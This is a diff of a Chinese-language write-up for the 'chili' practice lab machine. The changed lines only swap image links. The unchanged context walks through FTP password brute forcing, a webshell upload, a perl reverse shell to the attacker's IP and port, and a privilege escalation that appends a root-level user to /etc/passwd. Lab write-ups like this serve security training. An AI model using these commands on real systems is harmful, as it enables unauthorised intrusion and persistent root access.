@@ -16,7 +16,7 @@ title: chili
 
 使用arp-scan扫描内网，确定靶机IP
 
-![image-20240709181821299](https://cdn.a1pha.cn/img/202407112352634.png)
+![image-20240709181821299](https://img.crzliang.cn/img/202407112352634.png)
 
 ## nmap
 
@@ -30,37 +30,37 @@ nmap -sV -sC -p- 192.168.170.137
 
 以及80端口的http服务，对应Apache2.4.38
 
-![image-20240710132641807](https://cdn.a1pha.cn/img/202407112352636.png)
+![image-20240710132641807](https://img.crzliang.cn/img/202407112352636.png)
 
 ## dirseach
 
 使用dirsearch扫目录，也没有扫出有用的东西
 
-![image-20240710133422756](https://cdn.a1pha.cn/img/202407112352637.png)
+![image-20240710133422756](https://img.crzliang.cn/img/202407112352637.png)
 
 ## 查看源代码
 
 在源代码中看到一个敏感词`keywords`内容为：Chili，结合靶机名字，猜测为ftp的用户名
 
-![image-20240710133516341](https://cdn.a1pha.cn/img/202407112352638.png)
+![image-20240710133516341](https://img.crzliang.cn/img/202407112352638.png)
 
 # 漏洞利用
 
 ## hydra爆破ftp弱口令
 
-![image-20240711194440833](https://cdn.a1pha.cn/img/202407112352639.png)
+![image-20240711194440833](https://img.crzliang.cn/img/202407112352639.png)
 
 ## 超级弱口令爆破
 
-![image-20240711194505949](https://cdn.a1pha.cn/img/202407112352640.png)
+![image-20240711194505949](https://img.crzliang.cn/img/202407112352640.png)
 
 ## 登录ftp
 
-![image-20240711194623602](https://cdn.a1pha.cn/img/202407112352641.png)
+![image-20240711194623602](https://img.crzliang.cn/img/202407112352641.png)
 
 进入到网站的根目录下可以看到`.nano`和`.vim`两个隐藏文件夹，其中`.nano`文件夹具有**任何用户都可以读取、修改或执行该目录中的文件或目录**的权限，而`.vim`目录只有**所有者可以读取、修改或执行该目录中的文件或目录，而组用户和其他用户只能读取和执行，但不能修改**的权限
 
-![image-20240711200022620](https://cdn.a1pha.cn/img/202407112352642.png)
+![image-20240711200022620](https://img.crzliang.cn/img/202407112352642.png)
 
 那么我们可以利用`.nano`目录的权限，上传一句话木马
 
@@ -68,11 +68,11 @@ nmap -sV -sC -p- 192.168.170.137
 
 上传一句话木马后使用蚁剑连接
 
-![image-20240711202024498](https://cdn.a1pha.cn/img/202407112352643.png)
+![image-20240711202024498](https://img.crzliang.cn/img/202407112352643.png)
 
 当我们直接点击打开root目录时，是会提醒权限不够的，所以要进行提权的操作
 
-![image-20240711232306854](https://cdn.a1pha.cn/img/202407112352644.png)
+![image-20240711232306854](https://img.crzliang.cn/img/202407112352644.png)
 
 ## 反弹shell
 
@@ -136,7 +136,7 @@ $res = execute(which('perl')." /tmp/.bc $yourip $yourport &");
 
 反弹成功
 
-![image-20240711232550579](https://cdn.a1pha.cn/img/202407112352646.png)
+![image-20240711232550579](https://img.crzliang.cn/img/202407112352646.png)
 
 ## 提权
 
@@ -146,7 +146,7 @@ $res = execute(which('perl')." /tmp/.bc $yourip $yourport &");
 python3 -c "import pty;pty.spawn('/bin/bash')"
 ```
 
-![image-20240711232651731](https://cdn.a1pha.cn/img/202407112352647.png)
+![image-20240711232651731](https://img.crzliang.cn/img/202407112352647.png)
 
 ### enumy64
 
@@ -154,7 +154,7 @@ python3 -c "import pty;pty.spawn('/bin/bash')"
 
 可以看到`/etc/passwd`文允许其他用户读取和修改
 
-![image-20240711234018842](https://cdn.a1pha.cn/img/202407112352648.png)
+![image-20240711234018842](https://img.crzliang.cn/img/202407112352648.png)
 
 那么，我们就可以利用这个漏洞，添加一个新的用户，并加入到管理员组里，即可实现提权
 
@@ -166,7 +166,7 @@ openssl生成密码
 openssl passwd -1 -salt hack hack 
 ```
 
-![image-20240711234128116](https://cdn.a1pha.cn/img/202407112352649.png)
+![image-20240711234128116](https://img.crzliang.cn/img/202407112352649.png)
 
 写入`/etc/passwd`
 
@@ -174,19 +174,19 @@ openssl passwd -1 -salt hack hack
 echo 'hack:$1$hack$xR6zsfvpez/t8teGRRSNr.:0:0:root:/root:/bin/bash' >>/etc/passwd
 ```
 
-![image-20240711234332197](https://cdn.a1pha.cn/img/202407112352650.png)
+![image-20240711234332197](https://img.crzliang.cn/img/202407112352650.png)
 
 ### 提权成功
 
 切换用户即可看到当前用户已经成功加入到root组
 
-![image-20240711234351350](https://cdn.a1pha.cn/img/202407112352651.png)
+![image-20240711234351350](https://img.crzliang.cn/img/202407112352651.png)
 
 # flag
 
 读取root目录下的proof.txt文件即可获取到flag
 
-![image-20240711234542926](https://cdn.a1pha.cn/img/202407112352652.png)
+![image-20240711234542926](https://img.crzliang.cn/img/202407112352652.png)
 
 # 参考&工具
 
